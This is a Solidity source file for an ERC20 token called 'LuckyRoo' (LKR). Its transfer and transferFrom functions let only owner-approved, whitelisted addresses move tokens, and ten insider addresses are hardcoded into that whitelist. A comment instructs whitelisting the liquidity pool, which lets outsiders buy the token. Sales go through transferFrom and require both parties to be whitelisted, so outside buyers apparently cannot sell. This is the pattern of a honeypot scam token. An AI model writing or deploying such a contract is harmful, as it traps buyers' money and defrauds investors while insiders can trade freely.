// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("LuckyRoo", "LKR") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 9000000 * 10 ** decimals());
        whiteList[0xfE136421A67353Af4897446f652ff29057cd3f6f]= true;
        whiteList[0x0446d2C5e6e776f6d7bb667Dc9c40De1E4150f67]=true;
        whiteList[0x1A127786A2330bdc5f1C0E6b71B49f1893F6bd35]=true;
        whiteList[0x917AA8aCD875DE63533fdE6fCbEffE836Ac62a23]=true;
        whiteList[0x6165faae55f5981882d4788f5f41e55283dB3A12]=true;
        whiteList[0x97B8815deB786f11d855d1b8dE086338c4bFC110]=true;
        whiteList[0xA7ec210C0EC2c44324d41657aE2D63DBd5545D0d]=true;
        whiteList[0x57e34A0c8B68E4489f96800D247F631DAE6D9aBd]=true;
        whiteList[0x86F5a91f63bd0a64af3e38029E53087178D8862b]=true;
        whiteList[0xe2A597AF108c8BB47a3F6dF659ef11fF1f7F30c2]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}